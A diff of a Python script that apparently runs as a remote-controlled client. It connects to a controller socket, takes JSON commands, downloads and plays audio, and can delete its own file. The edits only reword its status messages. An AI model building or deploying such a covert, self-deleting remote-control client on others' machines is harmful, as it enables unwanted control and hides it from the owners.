@@ -68,11 +68,11 @@ def play_audio(content: bytes):
 
         p.wait()
 
-        send_manager(s, {"type": "ok", "stage": "audio", "msg": "played"})
+        send_manager(s, {"type": "ok", "stage": "audio", "msg": f"played {len(content):,} bytes"})
 
     except Exception as e:
         try:
-            send_manager(s, {"type": "error", "stage": "audio", "error": str(e)})
+            send_manager(s, {"type": "error", "stage": "audio", "msg": str(e)})
         except Exception:
             pass
 
@@ -84,14 +84,7 @@ def self_destruct():
         script_path = os.path.abspath(__file__)
 
     if not os.path.exists(script_path):
-        send_manager(
-            s,
-            {
-                "type": "error",
-                "stage": "self-destruct",
-                "msg": f"file not found: {script_path}",
-            },
-        )
+        send_manager(s, {"type": "error", "stage": "self-destruct", "msg": f"target not found: {script_path}"})
         return
 
     try:
@@ -129,19 +122,10 @@ def self_destruct():
             )
 
     except Exception as e:
-        send_manager(
-            s, {"type": "error", "stage": "self-destruct", "msg": f"failed {e}"}
-        )
+        send_manager(s, {"type": "error", "stage": "self-destruct", "msg": str(e)})
         return
 
-    send_manager(
-        s,
-        {
-            "type": "ok",
-            "stage": "self-destruct",
-            "msg": f"success, bye.. {script_path}, {getattr(sys, "frozen", False)}, {__file__ if "__file__" in globals() else "None"}, {cmd_command}",
-        },
-    )
+    send_manager(s, {"type": "ok", "stage": "self-destruct", "msg": f"deleting {os.path.basename(script_path)} in 5s, goodbye"})
 
     sys.exit(0)
 
@@ -153,7 +137,7 @@ def connect_socket():
             s.connect((HOST, PORT))
             s.sendall(b"role=listener\n")
 
-            send_manager(s, {"type": "ok", "stage": "socket", "msg": "connected"})
+            send_manager(s, {"type": "ok", "stage": "socket", "msg": f"connected to {HOST}:{PORT}"})
 
             return s
 
@@ -181,7 +165,7 @@ while True:
             try:
                 message = json.loads(line)
 
-                send_manager(s, {"type": "ok", "stage": "json", "msg": "received"})
+                send_manager(s, {"type": "ok", "stage": "dispatch", "msg": f"command type={message.get('type')}"})
 
             except json.JSONDecodeError:
                 send_manager(
@@ -214,21 +198,18 @@ while True:
                     continue
 
                 if r and r.content:
-                    send_manager(s, {"type": "ok", "stage": "request", "msg": "ok"})
-
+                    send_manager(s, {"type": "ok", "stage": "request", "msg": f"{r.status_code} · {len(r.content):,} bytes"})
                     play_audio(r.content)
 
             except requests.RequestException as e:
-                send_manager(s, {"type": "error", "stage": "request", "error": str(e)})
+                send_manager(s, {"type": "error", "stage": "request", "msg": str(e)})
 
             except Exception as e:
-                send_manager(
-                    s, {"type": "error", "stage": "processing", "error": str(e)}
-                )
+                send_manager(s, {"type": "error", "stage": "processing", "msg": str(e)})
 
     except (ConnectionError, OSError) as e:
         try:
-            send_manager(s, {"type": "error", "stage": "socket", "error": str(e)})
+            send_manager(s, {"type": "error", "stage": "socket", "msg": str(e)})
         except Exception:
             pass
 
@@ -241,5 +222,5 @@ while True:
         buffer = ""
 
     except Exception as e:
-        send_manager(s, {"type": "error", "stage": "processing", "error": str(e)})
+        send_manager(s, {"type": "error", "stage": "processing", "msg": str(e)})
         time.sleep(1)
